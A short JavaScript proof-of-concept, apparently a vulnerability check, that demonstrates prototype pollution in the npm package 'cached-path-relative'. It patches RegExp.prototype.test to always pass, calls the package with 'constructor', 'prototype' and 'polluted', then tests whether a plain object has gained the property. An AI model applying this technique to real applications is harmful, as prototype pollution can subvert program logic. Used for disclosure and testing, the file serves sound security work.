RegExp.prototype.test = () => true;
console.log({}.polluted);
var relative = require('cached-path-relative');
relative('constructor', 'prototype', 'polluted');
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}